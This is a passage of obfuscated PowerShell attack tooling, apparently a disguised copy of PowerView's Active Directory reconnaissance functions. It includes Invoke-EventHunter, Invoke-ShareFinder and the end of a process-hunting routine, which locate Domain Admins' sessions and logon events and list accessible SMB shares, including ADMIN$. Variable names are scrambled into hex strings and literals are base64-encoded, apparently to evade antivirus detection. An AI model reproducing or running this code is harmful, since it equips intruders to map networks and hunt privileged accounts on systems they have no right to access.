            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        if(!${a21a03a3d1ba4bbd8408c19660646dc4}) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAG8AYwBlAHMAcwAgAG4AYQBtAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAsACAAYgB1AGkAbABkAGkAbgBnACAAYQAgAHQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAHMAZQB0AA==')))
            ${bec7b23274ab4068b5f2614783a89d47} = @()
            if(${da7be972f7e44ec9875f40715ba00f6d}) {
                Write-Verbose "Querying target server '${da7be972f7e44ec9875f40715ba00f6d}' for local users"
                ${bec7b23274ab4068b5f2614783a89d47} = Get-NetLocalGroup ${da7be972f7e44ec9875f40715ba00f6d} -d722399685d842b19fa5d48261792164 | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                    ($_.AccountName).split("/")[1].toLower()
                }  | ? {$_}
            }
            elseif(${dfa85e24773f431f91e73de068d7b94e}) {
                Write-Verbose "[*] Using target user '${dfa85e24773f431f91e73de068d7b94e}'..."
                ${bec7b23274ab4068b5f2614783a89d47} = @( ${dfa85e24773f431f91e73de068d7b94e}.ToLower() )
            }
            elseif(${a57452fb8a9b43bcb40eaf9289200401}) {
                ${bec7b23274ab4068b5f2614783a89d47} = gc -Path ${a57452fb8a9b43bcb40eaf9289200401} | ? {$_}
            }
            elseif(${a6a10db45a0941659422112bc7aa06f5} -or ${d5a2a8c2315d401eac23f9bae417dc38}) {
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for users"
                    ${bec7b23274ab4068b5f2614783a89d47} += Get-NetUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${a6a10db45a0941659422112bc7aa06f5} -a48507564a8248e5b01d3a563f4bc865 ${d5a2a8c2315d401eac23f9bae417dc38} | % {
                        $_.samaccountname
                    }  | ? {$_}
                }            
            }
            else {
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for users of group '${a0852a4c33684bf0877105c6da3a9074}'"
                    ${bec7b23274ab4068b5f2614783a89d47} += Get-NetGroupMember -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624}| Foreach-Object {
                        $_.MemberName
                    }
                }
            }
            if ((-not ${b48dbad4885b4800980979010426b8fd}) -and ((!${bec7b23274ab4068b5f2614783a89d47}) -or (${bec7b23274ab4068b5f2614783a89d47}.Count -eq 0))) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
            }
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee}, ${a21a03a3d1ba4bbd8408c19660646dc4}, ${bec7b23274ab4068b5f2614783a89d47}, ${aa4e10a6a5fe4cc19679c3039fa02e52}, ${a3f847eaa4054bfaa0b1a0725f444c0d})
            ${4ec9c050c4c74ff6a6d4be971e455652} = $True
            if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                if(${aa4e10a6a5fe4cc19679c3039fa02e52} -and ${a3f847eaa4054bfaa0b1a0725f444c0d}) {
                    ${0977e15099f14d90a95a244e5e042d8c} = Get-NetProcess -aa4e10a6a5fe4cc19679c3039fa02e52 ${aa4e10a6a5fe4cc19679c3039fa02e52} -a3f847eaa4054bfaa0b1a0725f444c0d ${a3f847eaa4054bfaa0b1a0725f444c0d} -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ErrorAction SilentlyContinue
                }
                else {
                    ${0977e15099f14d90a95a244e5e042d8c} = Get-NetProcess -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ErrorAction SilentlyContinue
                }
                ForEach (${2d67a11c9caf46c08e634e718a0a2f46} in ${0977e15099f14d90a95a244e5e042d8c}) {
                    if(${a21a03a3d1ba4bbd8408c19660646dc4}) {
                        ${a21a03a3d1ba4bbd8408c19660646dc4}.split(",") | % {
                            if (${2d67a11c9caf46c08e634e718a0a2f46}.ProcessName -match $_) {
                                ${2d67a11c9caf46c08e634e718a0a2f46}
                            }
                        }
                    }
                    elseif (${bec7b23274ab4068b5f2614783a89d47} -contains ${2d67a11c9caf46c08e634e718a0a2f46}.User) {
                        ${2d67a11c9caf46c08e634e718a0a2f46}
                    }
                }
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
                'ProcessName' = ${a21a03a3d1ba4bbd8408c19660646dc4}
                'TargetUsers' = ${bec7b23274ab4068b5f2614783a89d47}
                'RemoteUserName' = ${aa4e10a6a5fe4cc19679c3039fa02e52}
                'RemotePassword' = ${a3f847eaa4054bfaa0b1a0725f444c0d}
            }
            Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
        }
        else {
            if(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -ne 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
                Write-Verbose "[*] Enumerating server ${5c10572590774a67ad57cb4f99935a3e} (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                ${934af845da6e4eb0a5370de6d7b8da04} = icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList ${5c10572590774a67ad57cb4f99935a3e}, $False, ${a21a03a3d1ba4bbd8408c19660646dc4}, ${bec7b23274ab4068b5f2614783a89d47}, ${aa4e10a6a5fe4cc19679c3039fa02e52}, ${a3f847eaa4054bfaa0b1a0725f444c0d}
                ${934af845da6e4eb0a5370de6d7b8da04}
                if(${934af845da6e4eb0a5370de6d7b8da04} -and ${cc7ef2f10c2142c5907263cb65776e2c}) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdAAgAHUAcwBlAHIALwBwAHIAbwBjAGUAcwBzACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
    }
}
function Invoke-EventHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = 'Domain Admins',
        [String]
        ${da7be972f7e44ec9875f40715ba00f6d},
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${d5a2a8c2315d401eac23f9bae417dc38},
        [String]
        ${a6a10db45a0941659422112bc7aa06f5},
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${a57452fb8a9b43bcb40eaf9289200401},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Int32]
        ${aecb0f2e08b640d5859ad521e9b30b9e} = 3,
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBFAHYAZQBuAHQASAB1AG4AdABlAHIA')))
        if(${afa30c601e734738b32424a6234484e4}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
        }
        elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
            ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
        }
        else {
            ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
        }
        if(!${c096522c7bbe4c7aaadf99843e3b09fb}) { 
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            elseif(${a2fbc6e3cd88453ea35f8017927b51ae} -or ${c4ea8c745d00425ab685ca6107c29659}) {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -a48507564a8248e5b01d3a563f4bc865 ${a2fbc6e3cd88453ea35f8017927b51ae} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4ea8c745d00425ab685ca6107c29659}
                }
            }
            else {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for domain controllers"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetDomainController -e22191a1db5b4c5bba42c2b9674b00a8 -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} | % { $_.dnshostname}
                }
            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${bec7b23274ab4068b5f2614783a89d47} = @()
        if(${da7be972f7e44ec9875f40715ba00f6d}) {
            Write-Verbose "Querying target server '${da7be972f7e44ec9875f40715ba00f6d}' for local users"
            ${bec7b23274ab4068b5f2614783a89d47} = Get-NetLocalGroup ${da7be972f7e44ec9875f40715ba00f6d} -d722399685d842b19fa5d48261792164 | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                ($_.AccountName).split("/")[1].toLower()
            }  | ? {$_}
        }
        elseif(${dfa85e24773f431f91e73de068d7b94e}) {
            Write-Verbose "[*] Using target user '${dfa85e24773f431f91e73de068d7b94e}'..."
            ${bec7b23274ab4068b5f2614783a89d47} = @( ${dfa85e24773f431f91e73de068d7b94e}.ToLower() )
        }
        elseif(${a57452fb8a9b43bcb40eaf9289200401}) {
            ${bec7b23274ab4068b5f2614783a89d47} = gc -Path ${a57452fb8a9b43bcb40eaf9289200401} | ? {$_}
        }
        elseif(${a6a10db45a0941659422112bc7aa06f5} -or ${d5a2a8c2315d401eac23f9bae417dc38}) {
            ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for users"
                ${bec7b23274ab4068b5f2614783a89d47} += Get-NetUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${a6a10db45a0941659422112bc7aa06f5} -a48507564a8248e5b01d3a563f4bc865 ${d5a2a8c2315d401eac23f9bae417dc38} | % {
                    $_.samaccountname
                }  | ? {$_}
            }            
        }
        else {
            ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for users of group '${a0852a4c33684bf0877105c6da3a9074}'"
                ${bec7b23274ab4068b5f2614783a89d47} += Get-NetGroupMember -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} | Foreach-Object {
                    $_.MemberName
                }
            }
        }
        if (((!${bec7b23274ab4068b5f2614783a89d47}) -or (${bec7b23274ab4068b5f2614783a89d47}.Count -eq 0))) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee}, ${bec7b23274ab4068b5f2614783a89d47}, ${aecb0f2e08b640d5859ad521e9b30b9e})
            ${4ec9c050c4c74ff6a6d4be971e455652} = $True
            if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                Get-UserEvent -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -a0311454eba740dfa486807a9ce23992 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA'))) -ee5488d91a354beea34a223ead095cdb ([DateTime]::Today.AddDays(-${aecb0f2e08b640d5859ad521e9b30b9e})) | ? {
                    ${bec7b23274ab4068b5f2614783a89d47} -contains $_.UserName
                }
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
                'TargetUsers' = ${bec7b23274ab4068b5f2614783a89d47}
                'SearchDays' = ${aecb0f2e08b640d5859ad521e9b30b9e}
            }
            Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
        }
        else {
            if(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -ne 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
                Write-Verbose "[*] Enumerating server ${5c10572590774a67ad57cb4f99935a3e} (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList ${5c10572590774a67ad57cb4f99935a3e}, $(-not ${e6e5f48677934e8a9b673971d54cb88b}), ${bec7b23274ab4068b5f2614783a89d47}, ${aecb0f2e08b640d5859ad521e9b30b9e}
            }
        }
    }
}
function Invoke-ShareFinder {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [Switch]
        ${b173874092404008b4d1f5a8d292fcf3},
        [Switch]
        ${dc5d2963ed0d46678b5ff19be341aff7},
        [Switch]
        ${e2923e8b16a94794bee0a875f5be9df0},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [Switch]
        ${a121bc72cbc943629c0ca150ad2e7524},
        [Switch]
        ${e367637d3d7c4d9ba14856581cd375ae},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose "[*] Running Invoke-ShareFinder with delay of ${b8c8aa64938b4bac902fc98afa97c067}"
        [String[]] ${3c5f3592b9554466a66f62fb20539434} = @('')
        if (${dc5d2963ed0d46678b5ff19be341aff7}) {
            ${3c5f3592b9554466a66f62fb20539434} = ${3c5f3592b9554466a66f62fb20539434} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkATgBUACQA')))
        }
        if (${e2923e8b16a94794bee0a875f5be9df0}) {
            ${3c5f3592b9554466a66f62fb20539434} = ${3c5f3592b9554466a66f62fb20539434} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))
        }
        if (${b173874092404008b4d1f5a8d292fcf3}) {
            ${3c5f3592b9554466a66f62fb20539434} = @('', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA='))), "C$", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkATgBUACQA'))))
        }
        if(!${c096522c7bbe4c7aaadf99843e3b09fb}) { 
            if(${afa30c601e734738b32424a6234484e4}) {
                ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
            }
            elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
                ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
            }
            else {
                ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
            }
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            else {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -a48507564a8248e5b01d3a563f4bc865 ${a2fbc6e3cd88453ea35f8017927b51ae} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4ea8c745d00425ab685ca6107c29659}
                }
            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee}, ${a121bc72cbc943629c0ca150ad2e7524}, ${3c5f3592b9554466a66f62fb20539434}, ${e367637d3d7c4d9ba14856581cd375ae})
            ${4ec9c050c4c74ff6a6d4be971e455652} = $True
            if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                ${3dd101277ed94d96a222ed2c5eb91979} = Get-NetShare -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                ForEach (${d1e9378c77f74922b541713bbdb6e6f4} in ${3dd101277ed94d96a222ed2c5eb91979}) {
                    Write-Debug "[*] Server share: ${d1e9378c77f74922b541713bbdb6e6f4}"
                    ${de35d4e716844b459615f7bc8855e381} = ${d1e9378c77f74922b541713bbdb6e6f4}.shi1_netname
                    ${cc73b6650ef1477893e1b7085da3cd40} = ${d1e9378c77f74922b541713bbdb6e6f4}.shi1_remark
                    ${efe450d53b084f3cb286d6a758f6ee94} = '\\'+${c096522c7bbe4c7aaadf99843e3b09fb}+'\'+${de35d4e716844b459615f7bc8855e381}
                    if ((${de35d4e716844b459615f7bc8855e381}) -and (${de35d4e716844b459615f7bc8855e381}.trim() -ne '')) {
                        if(${e367637d3d7c4d9ba14856581cd375ae}) {
                            if(${de35d4e716844b459615f7bc8855e381}.ToUpper() -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA')))) {
                                try {
                                    $Null = [IO.Directory]::GetFiles(${efe450d53b084f3cb286d6a758f6ee94})
                                    "\\${c096522c7bbe4c7aaadf99843e3b09fb}\${de35d4e716844b459615f7bc8855e381} `t- ${cc73b6650ef1477893e1b7085da3cd40}"
                                }
                                catch {
                                    Write-Debug "Error accessing path ${efe450d53b084f3cb286d6a758f6ee94} : $_"
                                }
                            }
                        }
                        elseif (${3c5f3592b9554466a66f62fb20539434} -NotContains ${de35d4e716844b459615f7bc8855e381}.ToUpper()) {
                            if(${a121bc72cbc943629c0ca150ad2e7524}) {
                                try {
                                    $Null = [IO.Directory]::GetFiles(${efe450d53b084f3cb286d6a758f6ee94})
                                    "\\${c096522c7bbe4c7aaadf99843e3b09fb}\${de35d4e716844b459615f7bc8855e381} `t- ${cc73b6650ef1477893e1b7085da3cd40}"
                                }
                                catch {
                                    Write-Debug "Error accessing path ${efe450d53b084f3cb286d6a758f6ee94} : $_"
                                }
                            }
                            else {
                                "\\${c096522c7bbe4c7aaadf99843e3b09fb}\${de35d4e716844b459615f7bc8855e381} `t- ${cc73b6650ef1477893e1b7085da3cd40}"
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
                'CheckShareAccess' = ${a121bc72cbc943629c0ca150ad2e7524}
                'ExcludedShares' = ${3c5f3592b9554466a66f62fb20539434}
                'CheckAdmin' = ${e367637d3d7c4d9ba14856581cd375ae}
            }
            Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
        }
        else {
            if(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -ne 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
